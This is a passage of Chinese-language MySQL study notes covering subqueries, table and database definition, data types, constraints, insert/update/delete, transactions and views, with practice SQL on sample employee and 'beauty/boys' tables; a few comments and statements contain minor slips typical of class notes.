#①查询所有manager的员工编号
SELECT DISTINCT manager_id
FROM employees

#②查询详细信息，满足employee_id=①
SELECT *
FROM employees
WHERE employee_id =ANY(
	SELECT DISTINCT manager_id
	FROM employees

);

# 7. 各个部门中 最高工资中最低的那个部门的 最低工资是多少

#①查询各部门的最高工资中最低的部门编号
SELECT department_id
FROM employees
GROUP BY department_id
ORDER BY MAX(salary)
LIMIT 1


#②查询①结果的那个部门的最低工资

SELECT MIN(salary) ,department_id
FROM employees
WHERE department_id=(
	SELECT department_id
	FROM employees
	GROUP BY department_id
	ORDER BY MAX(salary)
	LIMIT 1


);
# 8. 查询平均工资最高的部门的 manager 的详细信息: last_name, department_id, email, salary
#①查询平均工资最高的部门编号
SELECT 
    department_id 
FROM
    employees 
GROUP BY department_id 
ORDER BY AVG(salary) DESC 
LIMIT 1 

#②将employees和departments连接查询，筛选条件是①
    SELECT 
        last_name, d.department_id, email, salary 
    FROM
        employees e 
        INNER JOIN departments d 
            ON d.manager_id = e.employee_id 
    WHERE d.department_id = 
        (SELECT 
            department_id 
        FROM
            employees 
        GROUP BY department_id 
        ORDER BY AVG(salary) DESC 
        LIMIT 1) ;

```

### 1.3  DD 数据定义语言

```mysql
#DDL
/*
    数据定义语言
    库和表的管理

    一、库的管理
    创建、修改、删除
    二、表的管理
    创建、修改、删除

    创建： create
    修改： alter
    删除： drop
*/
```

#### 1.3.1 库的管理

##### 1-1 库的创建

```mysql
/*
语法：
create database  [if not exists]库名;
*/

#案例：创建库Books
CREATE DATABASE IF NOT EXISTS books ;
```

##### 1-2 库的修改

```mysql
RENAME DATABASE books TO 新库名;

#更改库的字符集
ALTER DATABASE books CHARACTER SET gbk;
```

##### 1-3 库的删除

```mysql
DROP DATABASE IF EXISTS books;
```

#### 1.3.2 表的管理

##### 2-1 表的创建

```mysql
/*
    语法：
    create table 表名(
        列名 列的类型【(长度) 约束】,
        列名 列的类型【(长度) 约束】,
        列名 列的类型【(长度) 约束】,
        ...
        列名 列的类型【(长度) 约束】
    )
*/
#案例：创建表Book
CREATE TABLE book(
	id INT,#编号
	bName VARCHAR(20),#图书名
	price DOUBLE,#价格
	authorId  INT,#作者编号
	publishDate DATETIME#出版日期
);


DESC book;

#案例：创建表author
CREATE TABLE IF NOT EXISTS author(
	id INT,
	au_name VARCHAR(20),
	nation VARCHAR(10)
)
DESC author;

```

##### 2-2 表的修改

```mysql
/*
语法
alter table 表名 add|drop|modify|change column 列名 【列类型 约束】;
*/
```

###### 2-1 修改列名

```mysql
#①修改列名
ALTER TABLE book CHANGE COLUMN publishdate pubDate DATETIME;
```

###### 2-2 修改列的类型或约束

```mysql
#②修改列的类型或约束
ALTER TABLE book MODIFY COLUMN pubdate TIMESTAMP;
```

###### 2-3 添加新列

```mysql
#③添加新列
ALTER TABLE author ADD COLUMN annual DOUBLE; 
```

###### 2-4 删除列

```mysql
#④删除列
ALTER TABLE book_author DROP COLUMN  annual;
```

###### 2-5 修改表名

```mysql
#⑤修改表名
ALTER TABLE author RENAME TO book_author;
```

##### 2-3 表的删除

```mysql
DROP TABLE IF EXISTS book_author;

SHOW TABLES;

#通用的写法：
DROP DATABASE IF EXISTS 旧库名;
CREATE DATABASE 新库名;

DROP TABLE IF EXISTS 旧表名;
CREATE TABLE  表名();
```

##### 2-4 表的复制

```mysql
INSERT INTO author VALUES
(1,'村上春树','日本'),
(2,'莫言','中国'),
(3,'冯唐','中国'),
(4,'金庸','中国');

SELECT * FROM Author;
SELECT * FROM copy2;
```

###### 4-1 仅仅复制表结构

```mysql
CREATE TABLE copy LIKE author;
```

###### 4-2 复制表的结构+数据

```mysql
CREATE TABLE copy2 
SELECT * FROM author;
```

###### 4-3  只复制部分数据

```mysql
CREATE TABLE copy3
SELECT id,au_name
FROM author 
WHERE nation='中国';
```

###### 4-4 仅仅复制某些字段

```mysql
CREATE TABLE copy4 
SELECT id,au_name
FROM author
WHERE 0;

```

#### 1.3.3 常见的数据类型

```mysql


其他：
    1，binary 和 varbinary 用于保存较短的二进制；
    2，Enum 用于保存枚举
    3，Set 用于保存集合
日期型
    1，date (4 字节) 1000-01-01 ~ 9999-12-31；
    2，datetime (8 字节)
    1000-01-01 00:00:00 ~ 9999-12-31 23:59:59；
    3，timestamp (4 字节) 1970~2038 年的某个时刻
    （受时区的影响）
    4，time 只有时间
    5，year 只有年份 1901 ~ 2155

*/
```

##### 3-1 整形

```mysql
/*
1，Tinyint（1 字节）
    有符号 -128~127
    无符号 0~255
    
2，Smallint（2 字节）
    有符号 -32768~32767
    无符号 0~65535
    
3，Mediumint（3 字节）
    有符号 -8388608~8388607
    无符号 0~1677215
    
4，Int，Integer（4 字节）
    有符号 -2147483648~2147483647
    无符号 0~4294967295
    
5，Bigint （8 字节）
反正非常非常大

特点：
① 如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，需要添加unsigned关键字
② 如果插入的数值超出了整型的范围,会报out of range异常，并且插入临界值
③ 如果不设置长度，会有默认的长度
长度代表了显示的最大宽度，如果不够会用0在左边填充，但必须搭配zerofill使用！
*/
```

###### 1-1 设置无符号和有符号

```mysql
DROP TABLE IF EXISTS tab_int;
CREATE TABLE tab_int(
	t1 INT(7) ZEROFILL,
	t2 INT(7) ZEROFILL 

);

DESC tab_int;

INSERT INTO tab_int VALUES(-123456);
INSERT INTO tab_int VALUES(-123456,-123456);
INSERT INTO tab_int VALUES(2147483648,4294967296);
INSERT INTO tab_int VALUES(123,123);

SELECT * FROM tab_int;
```

##### 3-2 小数

```mysql
/*
浮点型
    1，float(m,d) 4 字节
    2，Double 8 字节
    
定点类型
    1，Dec(m,d) m+2 字节
    2，Decimal(m,d)
 （dec,decimal 两者一样。Dec 是简写）
特点:
    1，m 是总的位数，d 是小数点后面保留的位数
    2，如果超过范围，插入的也是临界值
    3，M,d 都能省略；
    4，如果 decimal 的话 m 默认是 10，d 默认是 0；
    5，如果是 float 和 double 随着插入的数值的精度来确定精度；
    6，定点型精确度较高，如果要求插入的数值要求较高，如货币运算，则可以选择定点型；
    
原则：选择的类型越简单越好
*/

CREATE TABLE tab_char(
	c1 ENUM('a','b','c')


);

INSERT INTO tab_char VALUES('a');
INSERT INTO tab_char VALUES('b');
INSERT INTO tab_char VALUES('c');
INSERT INTO tab_char VALUES('m');
INSERT INTO tab_char VALUES('A');

SELECT * FROM tab_set;

CREATE TABLE tab_set(
	s1 SET('a','b','c','d')
);
INSERT INTO tab_set VALUES('a');
INSERT INTO tab_set VALUES('A,B');
INSERT INTO tab_set VALUES('a,c,d');

```

###### 2-1 测试M和D

```mysql
DROP TABLE tab_float;
CREATE TABLE tab_float(
	f1 FLOAT,
	f2 DOUBLE,
	f3 DECIMAL
);
SELECT * FROM tab_float;
DESC tab_float;

INSERT INTO tab_float VALUES(123.4523,123.4523,123.4523);
INSERT INTO tab_float VALUES(123.456,123.456,123.456);
INSERT INTO tab_float VALUES(123.4,123.4,123.4);
INSERT INTO tab_float VALUES(1523.4,1523.4,1523.4);

#原则：
/*
所选择的类型越简单越好，能保存数值的类型越小越好
*/
```

##### 3-3 字符型

```mysql
/*
字符型
    1.Char(m) m 是字符数
    2.Varcahr(m)
    3.Text
    4.Blob(较大的二进制)
    
Char()是固定长度的字符，varcahr(m)是固定长度的字符
*/

/*
较短的文本：
char
varchar

其他：
binary和varbinary用于保存较短的二进制
enum用于保存枚举
set用于保存集合

较长的文本：
text
blob(较大的二进制)
特点：

          写法		M的意思					       特点			  空间的耗费	  效率
char	char(M)		最大的字符数，可以省略，默认为1		固定长度的字符		比较耗费	高

varchar varchar(M)	 最大的字符数，不可以省略		       可变长度的字符		比较节省	低
*/

CREATE TABLE tab_char(
	c1 ENUM('a','b','c')
);

INSERT INTO tab_char VALUES('a');
INSERT INTO tab_char VALUES('b');
INSERT INTO tab_char VALUES('c');
INSERT INTO tab_char VALUES('m');
INSERT INTO tab_char VALUES('A');

SELECT * FROM tab_set;

CREATE TABLE tab_set(
	s1 SET('a','b','c','d')
);

INSERT INTO tab_set VALUES('a');
INSERT INTO tab_set VALUES('A,B');
INSERT INTO tab_set VALUES('a,c,d');
```

##### 3-4 日期型

```mysql
/*
分类：
    date只保存日期
    time 只保存时间
    year只保存年

    datetime保存日期+时间
    timestamp保存日期+时间

特点：

		  字节		   范围		时区等的影响
datetime	               8		1000——9999	                  不受
timestamp	4	                    1970-2038	                    受

*/

CREATE TABLE tab_date(
	t1 DATETIME,
	t2 TIMESTAMP

);
INSERT INTO tab_date VALUES(NOW(),NOW());

SELECT * FROM tab_date;

SHOW VARIABLES LIKE 'time_zone';

SET time_zone='+9:00';


```

#### 1.3.4 库和表的管理练习

```mysql
#1.	创建表dept1
    NAME	NULL?	TYPE
    id		INT(7)
    NAME		VARCHAR(25)

    USE test;
    CREATE TABLE dept1(
        id INT(7),
        NAME VARCHAR(25)
    );

#2.	将表departments中的数据插入新表dept2中
    CREATE TABLE dept2
    SELECT department_id,department_name
    FROM myemployees.departments;

#3.	创建表emp5
    NAME	NULL?	TYPE
    id		INT(7)
    First_name	VARCHAR (25)
    Last_name	VARCHAR(25)
    Dept_id		INT(7)

    CREATE TABLE emp5(
    id INT(7),
    first_name VARCHAR(25),
    last_name VARCHAR(25),
    dept_id INT(7)
    );


#4.	将列Last_name的长度增加到50
	ALTER TABLE emp5 MODIFY COLUMN last_name VARCHAR(50);
	
#5.	根据表employees创建employees2
	CREATE TABLE employees2 LIKE myemployees.employees;

#6.	删除表emp5
	DROP TABLE IF EXISTS emp5;

#7.	将表employees2重命名为emp5
	ALTER TABLE employees2 RENAME TO emp5;

#8.在表dept和emp5中添加新列test_column，并检查所作的操作
	ALTER TABLE emp5 ADD COLUMN test_column INT;
	
#9.直接删除表emp5中的列 dept_id
    DESC emp5;
    ALTER TABLE emp5 DROP COLUMN test_column;
```

#### 1.3.5 常见的约束

##### 5-1 分类

```mysql
/*
1. 非空约束： not null；
2. 默认约束： default；
3. 主键约束： primary key 保证字段值得唯一性，非空；
4. 为以约束： unique 保证字段值得唯一性，可以为空；
5. 检查约束： check （在 MySQL 中不支持，但不报错）；
6. 外键约束：foreign key 用于限制两个表的关系，用于保证该字段的值必须来自主表的关联列的值；在从表添加外键约束，用于引用主表中某列的值；

*/
```

##### 5-2 约束添加的分类

```mysql
## 1，列级约束：6 大约束都支持，但外键约束没有效果；
## 2，表级约束：除了非空，默认值约束，其余的都支持；
```

##### 5-3 添加约束的时机、

```mysql
## 1.创建表时
## 2.修改表时
```

##### 5-4 主键和唯一性对比

```mysql
/*
主键和唯一的大对比：

		保证唯一性  是否允许为空    一个表中可以有多少个   是否允许组合
主键	   √		 ×		       至多有1个             √，但不推荐
唯一	   √		 √		       可以有多个            √，但不推荐
	
外键：
	1、要求在从表设置外键关系
	2、从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求
	3、主表的关联列必须是一个key（一般是主键或唯一）
	4、插入数据时，先插入主表，再插入从表
	删除数据时，先删除从表，再删除主表
*/
```

##### 5-5 添加表时添加约束

###### 5-1 添加列级约束

```mysql
#1.添加列级约束
/*
语法：

直接在字段名和类型后面追加 约束类型即可。

只支持：默认、非空、主键、唯一
*/

USE students;
DROP TABLE stuinfo;
CREATE TABLE stuinfo(
	id INT PRIMARY KEY,#主键
	stuName VARCHAR(20) NOT NULL UNIQUE,#非空
	gender CHAR(1) CHECK(gender='男' OR gender ='女'),#检查
	seat INT UNIQUE,#唯一
	age INT DEFAULT  18,#默认约束
	majorId INT REFERENCES major(id)#外键
);

CREATE TABLE major(
	id INT PRIMARY KEY,
	majorName VARCHAR(20)
);

#查看stuinfo中的所有索引，包括主键、外键、唯一
SHOW INDEX FROM stuinfo;
```

###### 5-2 添加表级约束

```mysql
/*

语法：在各个字段的最下面
 【constraint 约束名】 约束类型(字段名) 
*/

DROP TABLE IF EXISTS stuinfo;
CREATE TABLE stuinfo(
	id INT,
	stuname VARCHAR(20),
	gender CHAR(1),
	seat INT,
	age INT,
	majorid INT,
	
	CONSTRAINT pk PRIMARY KEY(id),#主键
	CONSTRAINT uq UNIQUE(seat),#唯一键
	CONSTRAINT ck CHECK(gender ='男' OR gender  = '女'),#检查
	CONSTRAINT fk_stuinfo_major FOREIGN KEY(majorid) REFERENCES major(id)#外键	
);

SHOW INDEX FROM stuinfo;

#通用的写法：★
CREATE TABLE IF NOT EXISTS stuinfo(
	id INT PRIMARY KEY,
	stuname VARCHAR(20),
	sex CHAR(1),
	age INT DEFAULT 18,
	seat INT UNIQUE,
	majorid INT,
	CONSTRAINT fk_stuinfo_major FOREIGN KEY(majorid) REFERENCES major(id)
);

```

##### 5-6 修改表时添加约束

###### 6-1 添加列级约束

```mysql
alter table 表名 modify column 字段名 字段类型 新约束;
```

###### 6-2 添加表级约束

```mysql
alter table 表名 add 【constraint 约束名】 约束类型(字段名) 【外键的引用】;
```

```mysql
DROP TABLE IF EXISTS stuinfo;
CREATE TABLE stuinfo(
	id INT,
	stuname VARCHAR(20),
	gender CHAR(1),
	seat INT,
	age INT,
	majorid INT
)
DESC stuinfo;

```

###### 6-3 添加非空约束

```mysql
#1.添加非空约束
ALTER TABLE stuinfo MODIFY COLUMN stuname VARCHAR(20)  NOT NULL;
```

###### 6-4 添加默认约束

```mysql
#2.添加默认约束
ALTER TABLE stuinfo MODIFY COLUMN age INT DEFAULT 18;
```

###### 6-5 添加主键

```mysql
#①列级约束
	ALTER TABLE stuinfo MODIFY COLUMN id INT PRIMARY KEY;

#②表级约束
	ALTER TABLE stuinfo ADD PRIMARY KEY(id);
```

###### 6-6 添加唯一

```mysql
#①列级约束
	ALTER TABLE stuinfo MODIFY COLUMN seat INT UNIQUE;

#②表级约束
	ALTER TABLE stuinfo ADD UNIQUE(seat);
```

###### 6-7 添加外键

```mysql
ALTER TABLE stuinfo ADD CONSTRAINT fk_stuinfo_major FOREIGN KEY(majorid) REFERENCES major(id); 
```

##### 5-6 修改表时删除约束

###### 6-1 删除非空约束

```mysql
ALTER TABLE stuinfo MODIFY COLUMN stuname VARCHAR(20) NULL;
```

###### 6-2 删除默认约束

```mysql
ALTER TABLE stuinfo MODIFY COLUMN age INT ;
```

###### 6-3 删除主键

```mysql
ALTER TABLE stuinfo DROP PRIMARY KEY;
```

###### 6-4 删除唯一

```mysql
ALTER TABLE stuinfo DROP INDEX seat;
```

###### 6-5 删除外键

```mysql
ALTER TABLE stuinfo DROP FOREIGN KEY fk_stuinfo_major;
```

#### 1.3.6 标识列

```mysql
/*
又称为自增长列
含义：可以不用手动的插入值，系统提供默认的序列值


特点：
1、标识列必须和主键搭配吗？不一定，但要求是一个key
2、一个表可以有几个标识列？至多一个！
3、标识列的类型只能是数值型
4、标识列可以通过 SET auto_increment_increment=3;设置步长
可以通过 手动插入值，设置起始值
*/

```

##### 6-1 创建表时创建标识列

```mysql
DROP TABLE IF EXISTS tab_identity;
CREATE TABLE tab_identity(
	id INT  ,
	NAME FLOAT UNIQUE AUTO_INCREMENT,
	seat INT 
);

TRUNCATE TABLE tab_identity;

INSERT INTO tab_identity(id,NAME) VALUES(NULL,'john');
INSERT INTO tab_identity(NAME) VALUES('lucy');
SELECT * FROM tab_identity;

SHOW VARIABLES LIKE '%auto_increment%';

SET auto_increment_increment=3;
```



#### 1.3.7 常见约束 案例讲解

```mysql
#1.向表emp2的id列中添加PRIMARY KEY约束（my_emp_id_pk）

ALTER TABLE emp2 MODIFY COLUMN id INT PRIMARY KEY;
ALTER TABLE emp2 ADD CONSTRAINT my_emp_id_pk PRIMARY KEY(id);

#2.	向表dept2的id列中添加PRIMARY KEY约束（my_dept_id_pk）

#3.	向表emp2中添加列dept_id，并在其中定义FOREIGN KEY约束，与之相关联的列是dept2表中的id列。
ALTER TABLE emp2 ADD COLUMN dept_id INT;
ALTER TABLE emp2 ADD CONSTRAINT fk_emp2_dept2 FOREIGN KEY(dept_id) REFERENCES dept2(id);

		    位置		  支持的约束类型			      是否可以起约束名
列级约束：	列的后面	 语法都支持，但外键没有效果	     不可以
表级约束：	所有列的下面	默认和非空不支持，其他支持	    可以（主键没有效果）
```

### 1.4 DML 数据操纵语言

```mysql
/*
    数据操作语言：
    插入：insert
    修改：update
    删除：delete
*/
```

#### 1.4.1 插入

##### 1-1 经典插入

```mysql
*
语法：
insert into 表名(列名,...) values(值1,...);

*/
SELECT * FROM beauty;
#1.插入的值的类型要与列的类型一致或兼容
INSERT INTO beauty(id,NAME,sex,borndate,phone,photo,boyfriend_id)
VALUES(13,'唐艺昕','女','1990-4-23','1898888888',NULL,2);

#2.不可以为null的列必须插入值。可以为null的列如何插入值？
#方式一：
INSERT INTO beauty(id,NAME,sex,borndate,phone,photo,boyfriend_id)
VALUES(13,'唐艺昕','女','1990-4-23','1898888888',NULL,2);

#方式二：
INSERT INTO beauty(id,NAME,sex,phone)
VALUES(15,'娜扎','女','1388888888');

#3.列的顺序是否可以调换
INSERT INTO beauty(NAME,sex,id,phone)
VALUES('蒋欣','女',16,'110');


#4.列数和值的个数必须一致
INSERT INTO beauty(NAME,sex,id,phone)
VALUES('关晓彤','女',17,'110');

#5.可以省略列名，默认所有列，而且列的顺序和表中列的顺序一致
INSERT INTO beauty
VALUES(18,'张飞','男',NULL,'119',NULL,NULL);

```

##### 1-2 插入方式2

```mysql
/*

语法：
insert into 表名
set 列名=值,列名=值,...
*/

INSERT INTO beauty
SET id=19,NAME='刘涛',phone='999';

```

##### 1-3 两种方式比较

```mysql
#1、方式一支持插入多行,方式二不支持

INSERT INTO beauty
VALUES(23,'唐艺昕1','女','1990-4-23','1898888888',NULL,2)
,(24,'唐艺昕2','女','1990-4-23','1898888888',NULL,2)
,(25,'唐艺昕3','女','1990-4-23','1898888888',NULL,2);

#2、方式一支持子查询，方式二不支持
INSERT INTO beauty(id,NAME,phone)
SELECT 26,'宋茜','11809866';

INSERT INTO beauty(id,NAME,phone)
SELECT id,boyname,'1234567'
FROM boys WHERE id<3;
```

#### 1.4.2  修改

```mysql
/*

1.修改单表的记录★

语法：
    update 表名
    set 列=新值,列=新值,...
    where 筛选条件;

2.修改多表的记录【补充】

    语法：
    sql92语法：
    update 表1 别名,表2 别名
    set 列=值,...
    where 连接条件
    and 筛选条件;

sql99语法：
    update 表1 别名
    inner|left|right join 表2 别名
    on 连接条件
    set 列=值,...
    where 筛选条件;

*/
```



##### 2-1 修改单表记录

```mysql
#案例1：修改beauty表中姓唐的女神的电话为13899888899

UPDATE beauty SET phone = '13899888899'
WHERE NAME LIKE '唐%';

#案例2：修改boys表中id好为2的名称为张飞，魅力值 10
UPDATE boys SET boyname='张飞',usercp=10
WHERE id=2;
```

##### 2-2 修改多表记录

```mysql
#案例 1：修改张无忌的女朋友的手机号为114
UPDATE boys bo
INNER JOIN beauty b ON bo.`id`=b.`boyfriend_id`
SET b.`phone`='119',bo.`userCP`=1000
WHERE bo.`boyName`='张无忌';

#案例2：修改没有男朋友的女神的男朋友编号都为2号
UPDATE boys bo
RIGHT JOIN beauty b ON bo.`id`=b.`boyfriend_id`
SET b.`boyfriend_id`=2
WHERE bo.`id` IS NULL;

SELECT * FROM boys;
```

#### 1.4.3 删除语句

```mysql
/*

方式一：delete
语法：

1、单表的删除【★】
	delete from 表名 where 筛选条件

2、多表的删除【补充】
sql92语法：
    delete 表1的别名,表2的别名
    from 表1 别名,表2 别名
    where 连接条件
    and 筛选条件;

sql99语法：
    delete 表1的别名,表2的别名
    from 表1 别名
    inner|left|right join 表2 别名 on 连接条件
    where 筛选条件;

方式二：truncate
语法：truncate table 表名;

*/

```

##### 3-1 delete

###### 1-1 单表删除

```mysql
#案例：删除手机号以9结尾的女神信息
DELETE FROM beauty WHERE phone LIKE '%9';
SELECT * FROM beauty;

```

###### 1-2 多表删除

```mysql
#案例：删除张无忌的女朋友的信息
DELETE b
FROM beauty b
INNER JOIN boys bo ON b.`boyfriend_id` = bo.`id`
WHERE bo.`boyName`='张无忌';

#案例：删除黄晓明的信息以及他女朋友的信息
DELETE b,bo
FROM beauty b
INNER JOIN boys bo ON b.`boyfriend_id`=bo.`id`
WHERE bo.`boyName`='黄晓明';
```

##### 3-2 truncate语句

```mysql
#案例：将魅力值>100的男神信息删除
TRUNCATE TABLE boys 
```

##### 3-3 delete pk truncate

```mysql
/*

1.delete 可以加where 条件，truncate不能加

2.truncate删除，效率高一丢丢
3.假如要删除的表中有自增长列，
如果用delete删除后，再插入数据，自增长列的值从断点开始，而truncate删除后，再插入数据，自增长列的值从1开始。
4.truncate删除没有返回值，delete删除有返回值

5.truncate删除不能回滚，delete删除可以回滚.
*/

SELECT * FROM boys;

DELETE FROM boys;
TRUNCATE TABLE boys;
INSERT INTO boys (boyname,usercp)
VALUES('张飞',100),('刘备',100),('关云长',100);
```

#### 1.4.4 案例讲解

```mysql
#1.	运行以下脚本创建表my_employees

USE myemployees;
CREATE TABLE my_employees(
	Id INT(10),
	First_name VARCHAR(10),
	Last_name VARCHAR(10),
	Userid VARCHAR(10),
	Salary DOUBLE(10,2)
);
CREATE TABLE users(
	id INT,
	userid VARCHAR(10),
	department_id INT

);
#2.	显示表my_employees的结构
	DESC my_employees;

#3.	向my_employees表中插入下列数据
    ID	FIRST_NAME	LAST_NAME	USERID	SALARY
    1	patel		Ralph		Rpatel	895
    2	Dancs		Betty		Bdancs	860
    3	Biri		Ben		Bbiri	1100
    4	Newman		Chad		Cnewman	750
    5	Ropeburn	Audrey		Aropebur	1550

#方式一：
    INSERT INTO my_employees
    VALUES(1,'patel','Ralph','Rpatel',895),
    (2,'Dancs','Betty','Bdancs',860),
    (3,'Biri','Ben','Bbiri',1100),
    (4,'Newman','Chad','Cnewman',750),
    (5,'Ropeburn','Audrey','Aropebur',1550);
    
    DELETE FROM my_employees;
    
#方式二：
    INSERT INTO my_employees
    SELECT 1,'patel','Ralph','Rpatel',895 UNION
    SELECT 2,'Dancs','Betty','Bdancs',860 UNION
    SELECT 3,'Biri','Ben','Bbiri',1100 UNION
    SELECT 4,'Newman','Chad','Cnewman',750 UNION
    SELECT 5,'Ropeburn','Audrey','Aropebur',1550;
				
#4.	 向users表中插入数据
    1	Rpatel	10
    2	Bdancs	10
    3	Bbiri	20
    4	Cnewman	30
    5	Aropebur	40

    INSERT INTO users
    VALUES(1,'Rpatel',10),
    (2,'Bdancs',10),
    (3,'Bbiri',20);

#5.将3号员工的last_name修改为“drelxer”
	UPDATE my_employees SET last_name='drelxer' WHERE id = 3;

#6.将所有工资少于900的员工的工资修改为1000
	UPDATE my_employees SET salary=1000 WHERE salary<900;

#7.将userid 为Bbiri的user表和my_employees表的记录全部删除
    DELETE u,e
    FROM users u
    JOIN my_employees e ON u.`userid`=e.`Userid`
    WHERE u.`userid`='Bbiri';

#8.删除所有数据
    DELETE FROM my_employees;
    DELETE FROM users;
    
#9.检查所作的修正
    SELECT * FROM my_employees;
    SELECT * FROM users;

#10.清空表my_employees
	TRUNCATE TABLE my_employees;

```

### 1.5 TCL 事务控制语言

#### 1.5.1 事务的属性

```MySQL
1. 原子性
## 事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生
2. 一致性
## 事务必须使数据库从一个形状状态变换到另外一个一致性状态
3. 隔离性
## 一个事务不能被其他事务干扰，事务之间是隔离的，互不干扰
4. 持久性
## 事务一旦被提交，它对数据库中数据的改变就是永久性的
```

#### 1.5.2 事务的创建

```mysql
## 隐式事务：事务没有明显的开启和结束标记，比如 insert，update，delete 语句；
## 显示事务：具有明显的开启和结束标志。先设置自动提交功能为禁用，SET autocommit = 0;
```

![image-20230718225320480](../../%2525E9%252597%2525B2%2525E9%2525B1%2525BC%2525E7%2525AC%252594%2525E8%2525AE%2525B0/typora-user-images/image-20230718225320480.png)

![image-20230718225334560](../../%2525E9%252597%2525B2%2525E9%2525B1%2525BC%2525E7%2525AC%252594%2525E8%2525AE%2525B0/typora-user-images/image-20230718225334560.png)

```mysql
## 步骤一：开启事务
    1，Set autocommit = 0;
    2，Start transaction;(可选的，可以不写)；
    
## 步骤二：编写事务中的 SQL 语句
    3，语句 1;（select，insert，update，delete）
    4，语句 2；
    
## 步骤三：结束事务（提交事务或回滚事务）commit or rollback
```

#### 1.5.3 演示事务的使用步骤

```mysql
#开启事务
    SET autocommit=0;
    START TRANSACTION;
    
#编写一组事务的语句
    UPDATE account SET balance = 1000 WHERE username='张无忌';
    UPDATE account SET balance = 1000 WHERE username='赵敏';

#结束事务
    ROLLBACK;
    #commit;

```

#### 1.5.4 隔离机制

```mysql
## 对于同时运行的多个事务，当这些事务访问数据库中的相同数据时，如果没有采取必要的隔离机制，就会导致各种并发问题；

## 脏读：对于两个事务 T1，T2，T1 读取了已经被 T2 更新但还没被提交的字段之后，若 T2 回滚，T1 读取的内容就是临时无效的；

## 不可重复读：对于两个事务 T1，T2，T1 读取了一个字段，然后 T2 更新了该字段之后，T1 再次读取该字段，值就不一样了；

## 幻读：对于两个事务 T1，T2，T1 从一个表中读取了一个字段，然后 T2 在该表中插入了一些新的行之后，如果 T1 再次读取同一个表，就会多出几行；
```

#### 1.5.5 四种隔离级别

```mysql
## MySQL 支持 4 种事务隔离级别。MySQL 默认的事务隔离级别为：REPEATABLE READ
```

![image-20230718225816775](../../%2525E9%252597%2525B2%2525E9%2525B1%2525BC%2525E7%2525AC%252594%2525E8%2525AE%2525B0/typora-user-images/image-20230718225816775.png)

![image-20230718225827213](../../%2525E9%252597%2525B2%2525E9%2525B1%2525BC%2525E7%2525AC%252594%2525E8%2525AE%2525B0/typora-user-images/image-20230718225827213.png)

##### 1.5.6 注意

```mysql
## 1，5.7.2 之前 使用 show variables like 'tx_isoation' 或者 select @@tx_isolation;
## 2 ， 5.7.2 之 后 使 用 show variables like 'transaction_isoation' 或 者 select @@transaction_isoation;

Savepoint:节点名，设置保存点

```

![image-20230924175359617](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230924175359617.png)

```mysql 
SET autocommit=0;
START TRANSACTION;
DELETE FROM account WHERE id=25;
SAVEPOINT a;#设置保存点
DELETE FROM account WHERE id=28;
ROLLBACK TO a;#回滚到保存点


SELECT * FROM account;
```

#### 1.5.7 演示事务对于delete和truncate的处理的区别

```mysql
SET autocommit=0;
START TRANSACTION;

DELETE FROM account;
ROLLBACK;

```

#### 1.5.8 视图

```mysql
/*
含义：虚拟表，和普通表一样使用
mysql5.1版本出现的新特性，是通过表动态生成的数据

比如：舞蹈班和普通班级的对比
	创建语法的关键字	是否实际占用物理空间	使用

视图	create view		 只是保存了sql逻辑	   增删改查，只是一般不能增删改

表	 create table	  保存了数据		     增删改查
*/
```

##### 8-1 视图创建

```mysql
/*
语法：
create view 视图名
as
查询语句;

*/
USE myemployees;

#1.查询姓名中包含a字符的员工名、部门名和工种信息
#①创建
CREATE VIEW myv1
AS

SELECT last_name,department_name,job_title
FROM employees e
JOIN departments d ON e.department_id  = d.department_id
JOIN jobs j ON j.job_id  = e.job_id;


#②使用
SELECT * FROM myv1 WHERE last_name LIKE '%a%';

#2.查询各部门的平均工资级别

    #①创建视图查看每个部门的平均工资
        CREATE VIEW myv2
        AS
        SELECT AVG(salary) ag,department_id
        FROM employees
        GROUP BY department_id;

    #②使用
        SELECT myv2.`ag`,g.grade_level
        FROM myv2
        JOIN job_grades g
        ON myv2.`ag` BETWEEN g.`lowest_sal` AND g.`highest_sal`;



#3.查询平均工资最低的部门信息
SELECT * FROM myv2 ORDER BY ag LIMIT 1;

#4.查询平均工资最低的部门名和工资
CREATE VIEW myv3
AS
SELECT * FROM myv2 ORDER BY ag LIMIT 1;

SELECT d.*,m.ag
FROM myv3 m
JOIN departments d
ON m.`department_id`=d.`department_id`;

```

##### 8-2 视图的修改

###### 2-1 方式1：

```mysql
#方式一：
/*
create or replace view  视图名
as
查询语句;
*/
SELECT * FROM myv3 

CREATE OR REPLACE VIEW myv3
AS
SELECT AVG(salary),job_id
FROM employees
GROUP BY job_id;
```

###### 2-2 方式2：

```mysql
/*
语法：
alter view 视图名
as 
查询语句;
*/
ALTER VIEW myv3
AS
SELECT * FROM employees;
```

##### 8-3 视图的删除

```mysql
/*
语法：drop view 视图名,视图名,...;
*/

DROP VIEW emp_v1,emp_v2,myv3;
```

##### 8-4 查看视图

```mysql
DESC myv3;

SHOW CREATE VIEW myv3;
```

##### 8-5 视图的更新

```mysql
CREATE OR REPLACE VIEW myv1
AS
SELECT last_name,email,salary*12*(1+IFNULL(commission_pct,0)) "annual salary"
FROM employees;

CREATE OR REPLACE VIEW myv1
AS
SELECT last_name,email
FROM employees;

SELECT * FROM myv1;
SELECT * FROM employees;
```

###### 5-1 插入

```mysql
INSERT INTO myv1 VALUES('张飞','zf@qq.com');
```

###### 5-2 修改

```mysql
UPDATE myv1 SET last_name = '张无忌' WHERE last_name='张飞';
```

###### 5-3 删除

```mysql
DELETE FROM myv1 WHERE last_name = '张无忌';
```

###### 5-4 注意

```mysql
#具备以下特点的视图不允许更新
#①包含以下关键字的sql语句：分组函数、distinct、group  by、having、union或者union all

CREATE OR REPLACE VIEW myv1
AS
SELECT MAX(salary) m,department_id
FROM employees
GROUP BY department_id;

SELECT * FROM myv1;

#更新
UPDATE myv1 SET m=9000 WHERE department_id=10;

#②常量视图
CREATE OR REPLACE VIEW myv2
AS
SELECT 'john' NAME;

SELECT * FROM myv2;

#更新
UPDATE myv2 SET NAME='lucy';


#③Select中包含子查询
CREATE OR REPLACE VIEW myv3
AS

SELECT department_id,(SELECT MAX(salary) FROM employees) 最高工资
FROM departments;

#更新
SELECT * FROM myv3;
UPDATE myv3 SET 最高工资=100000;

#④join
CREATE OR REPLACE VIEW myv4
AS

SELECT last_name,department_name
FROM employees e
JOIN departments d
ON e.department_id  = d.department_id;

#更新

SELECT * FROM myv4;
